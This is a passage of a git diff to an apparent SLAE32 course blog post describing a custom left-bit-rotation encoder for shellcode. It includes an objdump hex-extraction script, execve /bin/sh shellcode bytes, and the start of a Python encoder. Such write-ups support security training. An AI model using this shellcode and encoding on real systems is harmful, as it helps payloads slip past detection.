@@ -18,32 +18,38 @@ tags:
   - Shellcode
 --- 
 ![](/assets/images/SLAE32.png)
+## Overview
 For my fourth assignment in the SLAE32 course, I created a custom Rotation Encoder.   
-How this works is to encode the payload, it rotates every bit to the left by one. If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1).  
-Example:
-![](/assets/images/rotateLeft.png)
-To decode, all the bits are rotated to the right by one. If there is a low bit, it is moved to the highest bit.  
-![](/assets/images/rotateRight.png)
+How this works is to encode the payload, it rotates every bit to the left by one. If the greatest bit (valued 128) falls off the left, it wraps around to the lowest bit (valued 1). To decode, all the bits are rotated to the right by one. If there is a low bit, it is moved to the highest bit.  
+#### Encode 
+![](/assets/images/rotateLeft.png)  
+#### Decode
+![](/assets/images/rotateRight.png)   
+## Encrypting the Payload
 The payload used for this example is the `execve` shellcode provided in the SLAE course.  
 
-To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
-To make it easier, I added it to a shellscript.  
+### Grabbing the Payload Shellcode
++ To quickly grab the hex from shellcode, I used the method shown in the SLAE course.   
++ To make it easier, I added it to a shellscript.  
 ```bash
 #!/bin/bash
+# Filename: objdump2hex.sh
+# Author:   boku
 OBJFILE=$1
 objdump -d $(pwd)/${1} | grep '[0-9a-f]:' | grep -v 'file'\
 | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' \
 | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s \
 | sed 's/^/"/' | sed 's/$/"/g'
 ```
-Grabbing the shellcode:
+### Using the Bash Script to get the Shellcode
 ```bash
 root@zed# ./objdump2hex.sh execve-stack 
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
-Perfect. Now we will need to encode this shellcode using the Python Encoder I created, `rotateLeftEncoder.py`.  
-The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
-As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the shellcode array.  
+Perfect. Now we will need to encode this shellcode using our Python Encoder `rotateLeftEncoder.py`.  
++ The new encoded shellcode is output in both the `\x` format and the `0x, ` format.  
++ As you can see in the top section, all that needs to be done to change the shellcode payload is replace the string in the `shellcode` array.  
+### Python Encoder
 ```python
 #!/usr/bin/python
 shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
